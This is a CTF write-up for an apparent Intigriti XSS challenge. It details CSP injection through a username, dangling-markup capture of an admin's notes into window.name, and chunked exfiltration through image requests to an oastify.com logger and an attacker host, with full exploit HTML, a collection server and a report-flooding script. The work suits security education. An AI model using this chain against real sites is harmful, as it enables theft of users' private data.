+++
title = "Intigriti June 2026 Challenge"
date = "2026-06-22"
[taxonomies]
categories = ["CTF"]
tags = ["CTF", "Challenge", "Intigriti", "XSS", "CSP Bypass", "Dangling Markup", "HTML Injection"]
+++

Intigriti June 2026 challenge write-up. An XSS challenge with a strict CSP, the solution involves dangling markup injection to capture the admin's notes and exfiltrate the flag.

<!-- more -->

## Challenge Description

You can find the challenge at [challenge-0626.intigriti.io](https://challenge-0626.intigriti.io/). It's a private notes app with a strict content policy. The admin bot visits any URL you report, and the flag is somewhere in the admin's notes.

## Basic Recon

After registering an account and logging in, you can create notes and search through them. The search endpoint at `/search` takes three parameters: `q` (title prefix), `description`, and `owner`.

The server returns a pretty strict CSP:

```
default-src 'none'; script-src 'nonce-...'; style-src 'nonce-...';
form-action 'self'; base-uri 'none'; report-uri /csp-report/USERNAME <!-- ← CSP bypass here -->
```

`default-src 'none'` kills pretty much every exfiltration channel — no images, no frames, no connections, no scripts without the nonce. The only thing not controlled by CSP? **Navigation**.

## HTML Injection

Both `q` and `description` parameters are reflected in the page without encoding. The `description` shows up in two places:

1. Inside a `<meta>` tag in the `<head>`:
```html
<meta name="description" content="Notes search — YOUR_INPUT">
```

2. Inside a form `<input>` (HTML-encoded, can't break out).

The `q` parameter appears as plain text at the bottom of the page:
```html
<p>YOUR_QUERY not found</p>
```

Both allow HTML injection — break out with `">` in the `description`, or drop raw tags in the `q`.

## CSP Bypass via Username

I remembered a research article I had read before, [“Bypassing CSP with Policy Injection”](https://portswigger.net/research/bypassing-csp-with-policy-injection) by Gareth Heyes, which was similar to this case, so I applied the same technique. And it worked!

The `owner` parameter is interesting. When set to `.` or `;..//`, the app falls back to your session username. If you register with a username containing CSP directives, they get injected into the page's CSP header.

Register with:
```
username: machiavelli; script-src-attr 'unsafe-inline'; img-src https://*.oastify.com/
```

Now when you visit `/search?q=...&description=...&owner=.`, the CSP becomes:
```
default-src 'none'; ... script-src-attr 'unsafe-inline'; img-src https://*.oastify.com/
```

{{ image(src="/csp-username-bypass.png", alt="CSP Bypass via Username", width=600) }}

This gives you inline event handlers and image loading — self-XSS confirmed with:
```
q="><img src="https://xxx.oastify.com/x" onerror=alert(1)>
```

But here's the problem: the **admin bot** has a clean username. The admin's CSP stays strict — no `unsafe-inline`, no `img-src` bypass. Event handlers won't fire for the admin.


## The Dangling Iframe Technique

Since we can't execute scripts on the admin's page, we need another way to exfiltrate data. Enter **dangling markup injection**.

The idea: inject an unclosed `<iframe name='` attribute. Everything after the opening `'` until the next `'` in the page becomes the iframe's `name` attribute value. If we put the **opening** quote in the `<head>` (via `description`) and the **closing** quote at the bottom of the `<body>` (via `q`), the entire page — including admin notes — gets captured into `window.name`.

```
description="><iframe name='
q=zzqx'
```

The HTML becomes:
```html
<!-- head -->
<meta name="description" content="Notes search — "><iframe name='">
<title>Search — Inside Job</title>
...
<!-- body, admin notes -->
<article class="note">
    <strong>FLAG_TITLE</strong>
    <p>INTIGRITI{...}</p>
</article>
...
<p>zzqx' not found</p>  <!-- ← the closing quote! -->
```

The first `'` in the page source is in `<p>zzqx' not found</p>` (the `q` input uses `&#39;` which is HTML-encoded). Everything between the `<iframe name='` in the head and that `'` at the bottom — all 710KB of it — becomes the iframe's `window.name`.

## Cross-Origin Access

The dangling iframe creates a child frame of the challenge page. Its `window.name` holds the captured HTML. But we're on a different origin — how do we read it?

The trick: **navigate** the child frame to `about:blank`. Cross-origin **writes** (setting `.location`) are allowed, even when reads are blocked. After navigating to `about:blank`, the child inherits **our** origin — and `window.name` persists across navigations.

```javascript
// Access the child frame created by the dangling <iframe name='...'>
let inner = f.contentWindow[0];

// Navigate it to about:blank (cross-origin write — allowed!)
inner.location = 'about:blank';

// Now same-origin — read window.name
let data = inner.name; // 710KB of captured HTML
```

## Setting Up the Server

We need a server that serves the exploit page. I used a VPS running Caddy as a reverse proxy:

**Caddyfile:**
```
attacker-server.example.com {
    reverse_proxy 127.0.0.1:3000
}
```

`nip.io` is a wildcard DNS that resolves `IP.nip.io` to `IP` — this gives us proper TLS/SNI without a domain name.

**Node.js server** (`server.js`) on port 3000:

```javascript
const http = require('http');
const fs = require('fs');
const path = require('path');

const chunks = new Map();
let totalLen = null;

const EXPLOIT_HTML = fs.readFileSync(path.join(__dirname, 'exploit.html'), 'utf8');

function maybeFinalize() {
  if (totalLen === null) return;
  const got = [...chunks.values()].reduce((a, b) => a + b.length, 0);
  if (got < totalLen) return;
  const data = [...chunks.keys()].sort((a, b) => a - b)
    .map(k => chunks.get(k)).join('');
  const decoded = decodeURIComponent(data);
  const m = decoded.match(/INTIGRITI\{[^}]+\}/);
  console.log('FLAG:', m ? m[0] : 'not found');
  fs.writeFileSync('dump-' + Date.now() + '.html', decoded);
}

http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');

  if (req.url === '/' || req.url === '/exploit.html') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(EXPLOIT_HTML);
  }

  if (req.url.startsWith('/log')) {
    const u = new URL('http://x' + req.url);
    if (u.searchParams.has('len')) {
      chunks.clear();
      totalLen = +u.searchParams.get('len');
    }
    if (u.searchParams.has('i')) {
      chunks.set(+u.searchParams.get('i'), u.searchParams.get('d') || '');
      maybeFinalize();
    }
    return res.end('ok');
  }

  res.writeHead(404);
  res.end();
}).listen(3000, '127.0.0.1');
```

**The exploit page** (`exploit.html`):

```html
<!doctype html>
<html>
<head><meta charset="utf-8"><title>exploit</title></head>
<body>
<script>
(function () {
  const LOG = 'https://xxx.oastify.com';
  const OWNER = 'admin';
  const inj = '"><iframe name=\'';

  const f = document.createElement('iframe');
  f.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px';

  f.src = 'https://challenge-0626.intigriti.io/search'
        + '?q=' + encodeURIComponent("zzqx'")
        + '&description=' + encodeURIComponent(inj)
        + '&owner=' + encodeURIComponent(OWNER);

  let fired = 0;
  f.onload = () => {
    if (fired++) return;
    new Image().src = LOG + '?stage=parent_onload';

    let inner;
    try { inner = f.contentWindow[0]; }
    catch (e) {
      new Image().src = LOG + '?stage=index&err=' + encodeURIComponent(e.message);
      return;
    }
    if (!inner) {
      new Image().src = LOG + '?stage=noinner';
      return;
    }

    try { inner.location = 'about:blank'; }
    catch (e) {
      new Image().src = LOG + '?stage=nav&err=' + encodeURIComponent(e.message);
      return;
    }

    setTimeout(() => {
      let data;
      try { data = (f.contentWindow[0] && f.contentWindow[0].name) || ''; }
      catch (e) {
        new Image().src = LOG + '?stage=read&err=' + encodeURIComponent(e.message);
        return;
      }

      if (!data) {
        new Image().src = LOG + '?stage=nodata';
        return;
      }

      const encoded = encodeURIComponent(data);
      const CHUNK = 1500;
      new Image().src = LOG + '?len=' + encoded.length
                     + '&raw=' + data.length
                     + '&n=' + Math.ceil(encoded.length / CHUNK);

      for (let i = 0; i < encoded.length; i += CHUNK) {
        new Image().src = LOG + '?i=' + i + '&d=' + encoded.slice(i, i + CHUNK);
      }
    }, 1500);
  };

  document.body.appendChild(f);
})();
</script>
</body>
</html>
```

## Reporting to the Admin

With the server running, send reports that redirect the admin to our exploit page:

```
POST /report
Host: challenge-0626.intigriti.io
Cookie: session=YOUR_SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

path=/search?q=UNIQUE_ID&description="><meta http-equiv="refresh" content="0;url=https://attacker-server.example.com/">&owner=admin
```

The admin bot:
1. Visits the challenge search page
2. The meta refresh redirects to our exploit page
3. The exploit creates an iframe to the challenge with the dangling injection and `owner=admin`
4. The admin's `SameSite=None` session cookie is sent with the iframe request
5. The iframe loads the admin's private search results
6. The dangling `<iframe name='` captures all 710KB of HTML into `window.name`
7. The child iframe is navigated to `about:blank` → same-origin → `window.name` is read
8. Data is chunked and sent to our server via `new Image().src`

## Getting the Flag

```javascript
const https = require('https');
const COOKIE = 'session=YOUR_SESSION_COOKIE';
const SERVER = 'https://attacker-server.example.com';

function sendReport() {
  const meta = '"><meta http-equiv="refresh" content="0;url=' + SERVER + '">';
  const path = '/search?q=' + Date.now()
    + '&description=' + encodeURIComponent(meta)
    + '&owner=admin';
  const postData = 'path=' + encodeURIComponent(path);

  const req = https.request({
    hostname: 'challenge-0626.intigriti.io', port: 443,
    path: '/report', method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Cookie': COOKIE
    }
  }, (res) => res.resume());
  req.write(postData);
  req.end();
}

// Send multiple with unique q= values to avoid dedup
for (let i = 0; i < 30; i++) sendReport();
```

After a few minutes, the server logs:

```
STAGE parent_onload
expecting 710395 bytes (encoded)
FLAG: INTIGRITI{019ea42e-f5af-76ea-85d7-7459d17736ce}
dump written to dump-1781900893631.html
```

## Congratulations!

**Flag:** `INTIGRITI{019ea42e-f5af-76ea-85d7-7459d17736ce}`

A very fun challenge that forces you to get creative with HTML parsing quirks. The key takeaways:

- `default-src 'none'` kills everything except navigation — so use it
- Dangling markup is a powerful technique when scripts are blocked
- Cross-origin **writes** (location) are allowed even when reads are blocked
- `window.name` persists across navigations — and becomes same-origin after `about:blank`
- Always use unique values in your report payloads to avoid admin bot dedup

---

If you have any questions, feel free to reach out to me on [X](https://x.com/machiavelli) and [Keybase](https://keybase.io/makyavelli)!